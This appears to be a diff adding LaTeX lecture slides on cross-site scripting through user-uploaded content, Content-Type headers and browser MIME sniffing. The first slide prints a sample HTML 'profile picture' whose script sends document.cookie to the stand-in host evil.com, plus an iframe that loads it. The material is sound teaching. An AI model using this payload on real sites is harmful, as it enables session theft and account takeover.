@@ -1,0 +1,52 @@
+
+\begin{frame}[fragile,label=xssUserContent]{XSS and user content}
+    \begin{itemize}
+    \item XSS makes hosting \myemph{user uploaded content} really tricky
+    \item example: allow users to upload profile pictures
+    \item my ``profile picture'' is this ``image'' file:
+\begin{minted}[fontsize=\small]{HTML}
+<!DOCTYPE html>
+<html><body><script>
+var image = new Image();
+image.src = "https://evil.com/?cookie=" + document.cookie;
+</script></body></html>
+\end{minted}
+    \item then I have a webpage with:
+\begin{minted}[fontsize=\small]{HTML}
+<iframe src="https://example.com/get-picture?user=myusername">
+\end{minted}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{content-types to the rescue?}
+    \begin{itemize}
+        \item HTTP response headers include a \myemph{Content-Type}
+        \begin{itemize}
+            \item \fbox{\tt Content-Type: text/html} --- is HTML
+            \item \fbox{\tt Content-Type: image/png} --- is PNG-format image
+        \item \ldots
+        \end{itemize}
+    \item \myemph{\textbf{should} prevent this problem} --- if server sends it
+        \begin{itemize}
+        \item browser should try to display HTML ``profile pic'' as image, not webpage
+        \item \ldots even though iframe expects a webpage
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{content-types and browsers}
+    \begin{itemize}
+    \item a few webservers \myemph{consistently sent the wrong content-type}
+        \begin{itemize}
+            \item example: send everything as \texttt{text/plain}
+        \end{itemize}
+    \item browsers sometimes tried to \myemph{compensate}!
+    \item example: Internet Explorer before version 8: \\
+        \texttt{image/png} is HTML if it looks like HTML
+    \item example: many browsers: \\
+        \texttt{text/plain} is HTML if it looks like HTML
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{modern content-type inference}
+\end{frame}
